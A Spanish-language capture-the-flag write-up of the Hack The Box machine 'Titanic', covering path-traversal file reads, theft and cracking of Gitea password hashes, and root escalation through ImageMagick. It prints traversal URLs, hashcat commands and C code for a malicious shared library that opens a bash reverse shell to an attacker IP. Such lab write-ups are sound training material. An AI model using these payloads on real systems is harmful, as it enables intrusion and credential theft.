# Informe Explotación - Titanic
Este informe documenta el proceso completo de explotación de la máquina **Titanic** en la plataforma Hack The Box. A través de diversas fases, se identificaron servicios vulnerables, se explotaron fallos de configuración y se obtuvo acceso privilegiado al sistema. El objetivo de este informe es detallar cada uno de los pasos seguidos, desde el reconocimiento hasta la escalada de privilegios.

## Índice
1. [Informe de Explotación - Titanic](#informe-de-explotación---Titanic)
2. [Información General](#información-general)
3. [Reconocimiento](#reconocimiento)
    - [Escaneo de Puertos](#escaneo-de-puertos)
    - [Enumeración de Servicios](#enumeración-de-servicios)
4. [Análisis de Vulnerabilidades](#análisis-de-vulnerabilidades)
5. [Explotación Inicial](#explotación-inicial)
6. [Post-Explotación](#post-explotación)
7. [Conclusiones](#conclusiones)

## Información General
- **Nombre de la máquina:** Titanic
- **Nivel de dificultad:** Fácil
- **Dirección IP:** 10.10.11.55
- **Sistema Operativo:** Linux

## Reconocimiento
### Escaneo de Puertos
Comando utilizado: 
``` bash
nmap -sC -sV 10.10.11.55
```

Resultados:
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/HTB/Easy/Titanic/media/img/nmap.png" alt="nmap" style="border-radius: 10px;">
</p>

<br>

### Enumeración de Servicios
- **SSH (Puerto 22):** Servicio activo, pero sin credenciales conocidas. 
- **Web (Puerto 80):** Se identificó un servicio web en el puerto 80. Al acceder al sitio web, se observó que contenía varios botones, de los cuales solo dos interactuaban con el usuario: Book Now y Book Your Trip. Ambos redirigían a un formulario donde los usuarios podían ingresar información, como nombre, email y teléfono, que luego se descargaba en formato **.json**.

## Análisis de Vulnerabilidades
### 1. Vulnerabilidad en el Servicio Web (LFI)
Durante el análisis del tráfico HTTP, se identificó que el servicio web permitía realizar descargas de archivos a través de un endpoint específico: ``/download?ticket=``. Al observar las peticiones con Burp Suite, se descubrió que era posible realizar un ataque de **Local File Inclusion (LFI)**.

Al manipular el parámetro **ticket**, fue posible realizar un path traversal que permitió acceder al archivo ``/etc/passwd`` del sistema, lo que reveló la existencia de un usuario con el ID 1000, llamado **developer**. Esta vulnerabilidad de LFI facilitó el acceso a archivos sensibles en el servidor y permitió recolectar más información sobre el sistema.

### 2. Exposición de Archivos Sensibles
Al acceder al archivo ``/etc/hosts``, se encontraron referencias a otro dominio: **dev.titanic.htb**. Esto sugería que el sistema podría estar configurado para interactuar con otro servicio o dominio. Este archivo también podría ofrecer pistas adicionales sobre cómo interactuar con otros servicios o redes dentro de la máquina.

### 3. Explotación de Gitea
Se descubrió que en el dominio dev.titanic.htb había un servicio de Gitea en ejecución. Este servicio permite gestionar repositorios Git, y tras explorar sus opciones, se identificó que el archivo de configuración **app.ini**, ubicado en ``/home/developer/gitea/data/gitea/conf/app.ini``, contenía información sensible sobre la base de datos, incluyendo la ubicación de la base de datos SQLite.

Se encontró que la base de datos **gitea.db** contenía una tabla de usuarios con las contraseñas almacenadas de forma hash. La contraseña del usuario developer estaba protegida con el algoritmo **PBKDF2**, y el hash pudo ser crackeado utilizando **Hashcat**.

### 4. Vulnerabilidad en ImageMagick (Escalada de Privilegios)
Se detectó un script automatizado en ``/opt/scripts/identify_images.sh`` que procesaba imágenes en el directorio ``/opt/app/static/assets/images/`` utilizando la herramienta **ImageMagick**. El script procesaba imágenes **.jpg** y extraía los metadatos, lo que incluía la ejecución de comandos a través de ImageMagick sin realizar una validación adecuada de las bibliotecas compartidas.

Se identificó que **ImageMagick** cargaba bibliotecas compartidas sin comprobar si eran maliciosas, lo que permitía que un atacante pudiera ejecutar código arbitrario. Esto presentó un vector de ataque para escalar privilegios.

## Explotación Inicial
Durante la interacción con la funcionalidad de descarga de formularios, interceptamos la petición HTTP con Burp Suite y observamos que el endpoint ``/download?ticket=<valor>`` era susceptible a manipulación. Al modificar el parámetro ticket, comprobamos que la aplicación era vulnerable a LFI.
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/HTB/Easy/Titanic/media/img/burpsuite.png" alt="burpsuite" style="border-radius: 10px;">
</p>

<br>

A través de está vulnerabilidad, fue posible acceder al archivo ``/etc/passwd``, revelando usuarios del sistema. Entre ellos, detectamos al usuario developer con UID 1000, lo que indicaba que probablemente se trataba del usuario principal del sistema.
```text
titanic.htb/download?ticket=../../../../etc/passwd
```
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/HTB/Easy/Titanic/media/img/etc_passwd.png" alt="etc_passwd" style="border-radius: 10px;">
</p>

<br>

Posteriormente, accedimos al archivo ``/etc/hosts``para identificar dominios adicionales configurados localmente:
```text
titanic.htb/download?ticket=../../../../etc/hosts
```
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/HTB/Easy/Titanic/media/img/etc_hosts.png" alt="etc_hosts" style="border-radius: 10px;">
</p>

<br>

La lectura del archivo reveló un nuevo dominio interno: **dev.titanic.htb**, el cual añadimos manualmente al archivo ``/etc/hosts`` de nuestra máquina atacante.

Descubrimos que se trataba de una instancia de **Gitea**, una plataforma de control de versiones similar a GitHub. 

>[!TIP]
>Regístrate en la web

Desde el apartado de repositorios públicos ("Explore"), analizamos dos proyectos accesibles: **docker-config** y **flash-app**. En el repositorio docker-config hallamos un archivo **docker-compose.yml** que revelaba cómo estaba desplegada la instancia de Gitea:
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/HTB/Easy/Titanic/media/img/docker_compose.png" alt="docker_compose" style="border-radius: 10px;">
</p>

<br>

Esto implica que toda la información de Gitea, incluyendo su configuración **app.ini**, base de datos **gitea.db** y posiblemente claves SSH, está almacenada localmente bajo ``/home/developer/gitea/data``, lo que representa un vector de ataque viable si se combinan con otras vulnerabilidades como el LFI previamente descubierto.

Aprovechando la vulnerabilidad LFI, se descargó **app.ini** y **gitea.db**
```
titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/conf/app.ini

titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/gitea.db
```

>[!NOTE]
> El archivo **app.ini** contenía, entre otros datos sensibles, la ruta completa de la base de datos de Gitea.

Con el archivo **.db** en mano, se inspeccionó su contenido utilizando SQLite:
```bash 
sqlite gitea.db
sqlite> .tables
sqlite> SELECT name, passwd, salt FROM user;
```
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/HTB/Easy/Titanic/media/img/select.png" alt="select" style="border-radius: 10px;">
</p>

<br>

Se utilizó un script en Python para generar un hash en el mismo formato con el objetivo de comprobar la contraseña y posteriormente crackearlo con Hashcat. La entrada final en Hashcat adoptó el siguiente formato compatible con **-m 10900**. El parámetro -m 10900 en Hashcat indica que el tipo de hash a crackear es PBKDF2-HMAC-SHA256

>[!NOTE]
> <a href="https://gist.githubusercontent.com/h4rithd/0c5da36a0274904cafb84871cf14e271/raw/f109d178edbe756f15060244d735181278c9b57e/gitea2hashcat.py">Script</a>

<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/HTB/Easy/Titanic/media/img/hash.png" alt="hash" style="border-radius: 10px;">
</p>

<br>

Y se ejecutó el ataque con **hashcat**
``` bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/HTB/Easy/Titanic/media/img/hashcat.png" alt="hashcat" style="border-radius: 10px;">
</p>

<br>

**- Developer Password:** 25282528

Como resultado de la ejecución anterior, obtenemos la contraseña asociada al usuario **developer**
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/HTB/Easy/Titanic/media/img/ssh.png" alt="ssh" style="border-radius: 10px;">
</p>

<br>

Al acceder exitosamente al sistema, navegamos al directorio personal del usuario ``/home/developer/``s donde encontramos el archivo **user.txt**, conteniendo así la **flag de usuario**.

## Post-Explotación
Una vez obtenida la sesión como el usuario developer, el siguiente paso fue identificar vectores para escalar privilegios a root. Para ello, comenzamos enumerando los procesos y archivos abiertos mediante los comandos **ps aux** y **lsof**, ya que el usuario no podía ejecutar comandos como root. Durante esta revisión, notamos que existía un proceso ejecutando el archivo ``/opt/app/app.py``, lo que llamó nuestra atención.
``` bash
ps aux
lsof | grep /opt/app
```
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/HTB/Easy/Titanic/media/img/ps_lsof.png" alt="ps_lsof" style="border-radius: 10px;">
</p>

<br>

Exploramos el directorio ``/opt/``, donde encontramos tres subdirectorios: app, containerd y scripts. Dentro de ``/opt/scripts/``, descubrimos un script interesante llamado **identify_images.sh**
El contenido del script identify_images.sh revelaba que:
- Cambiaba el directorio de trabajo a /opt/app/static/assets/images/.
- Vaciaba el contenido del archivo metadata.log con truncate -s 0 metadata.log.
- Encontraba todos los archivos .jpg en ese directorio.
- Procesaba esas imágenes usando el comando identify de ImageMagick y almacenaba la salida en metadata.log.
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/HTB/Easy/Titanic/media/img/cat.png" alt="cat" style="border-radius: 10px;">
</p>

<br>

Este comportamiento automático indicaba que cualquier archivo **.jpg** subido en esa ruta sería procesado automáticamente mediante identify. Investigando vulnerabilidades conocidas en **ImageMagick**, descubrimos que ciertas versiones de la herramienta son vulnerables a la ejecución de código arbitrario mediante la carga maliciosa de bibliotecas compartidas. <a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8">Arbitrary Code Execution in `AppImage` version `ImageMagick`</a>
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.7/4444 0>&1'");
    exit(0);
}
```
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/HTB/Easy/Titanic/media/img/exploit.png" alt="exploit" style="border-radius: 10px;">
</p>

<br>

Explicación del codigo:
- **Lenguaje:** Código en C destinado a compilarse como una biblioteca compartida (.so).
- **Constructor:** La función init() usa __attribute__((constructor)), lo que provoca que se ejecute automáticamente al cargar la librería.
- **Acción principal:** Dentro de init(), se ejecuta system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.7/4444 0>&1'"); para lanzar una reverse shell.
- **Reverse Shell:** Establece una conexión interactiva hacia la máquina atacante 10.10.16.7 en el puerto 4444.
- **Terminación:** Después de ejecutar la shell, el programa llama a exit(0); para finalizar limpiamente.

Para aprovechar está vulnerabilidad, creamos una biblioteca compartida maliciosa **libxcb.so.1** compilándola de la siguiente manera:
``` bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 exploit.c
```
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/HTB/Easy/Titanic/media/img/gcc.png" alt="gcc" style="border-radius: 10px;">
</p>

<br>

Después de compilar la biblioteca, copiamos una imagen existente **entertainment.jpg** renombrándola como **exploit.jpg** dentro del directorio ``/opt/app/static/assets/images/:``
```bash
cp entertainment.jpg exploit.jpg
```
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/HTB/Easy/Titanic/media/img/cp_final.png" alt="cp_final" style="border-radius: 10px;">
</p>

<br>

De este modo, el script identify_images.sh, al ser ejecutado automáticamente, provocó que ImageMagick cargase nuestra **libxcb.so.1**, ejecutando así el payload y dándonos una shell como root.
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/HTB/Easy/Titanic/media/img/nc.png" alt="nc" style="border-radius: 10px;">
</p>

<br>

Tras escalar privilegios y obtener una shell como root, donde encontramos el archivo **root.txt**. Completando así la explotación de la máquina.
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/HTB/Easy/Titanic/media/img/flag_root.png" alt="flag_root" style="border-radius: 10px;">
</p>

<br>

## Conclusiones
Durante la explotación de la máquina Titanic, hemos llevado a cabo un proceso completo de análisis, explotación y escalada de privilegios basado en un enfoque sistemático:
- **Reconocimiento inicial:** Mediante escaneo de puertos y enumeración de servicios, descubrimos servidores web activos y rutas accesibles, lo que nos permitió encontrar vectores de entrada iniciales.
- **Vulnerabilidad LFI:** Identificamos una vulnerabilidad de Local File Inclusion (LFI) en la funcionalidad de descarga de la web, que nos permitió acceder a archivos sensibles del sistema, como ``/etc/passwd`` y configuraciones de servicios.
- **Acceso a credenciales:** Gracias al LFI, pudimos obtener la base de datos **gitea.db**, extrayendo hashes de contraseñas y utilizando herramientas como hashcat para crackear credenciales válidas.
- **Acceso inicial:** Conseguimos conectarnos vía SSH utilizando las credenciales de un usuario legítimo **(developer)** y obtuvimos la flag de usuario.
- **Escalada de privilegios:** Analizando los procesos activos y scripts automatizados, detectamos una vulnerabilidad de ejecución de código en una versión insegura de ImageMagick, permitiendo cargar una librería maliciosa **(libxcb.so.1)** para ejecutar una reverse shell como **root**.
- **Compromiso total:** Finalmente, accedimos a una shell como usuario root, consiguiendo la flag de root y demostrando la explotación completa del sistema.

Esta máquina ha puesto a prueba conocimientos de explotación web, análisis de sistemas Linux, tratamiento de hashes y técnicas de escalada mediante vulnerabilidades en software instalado.
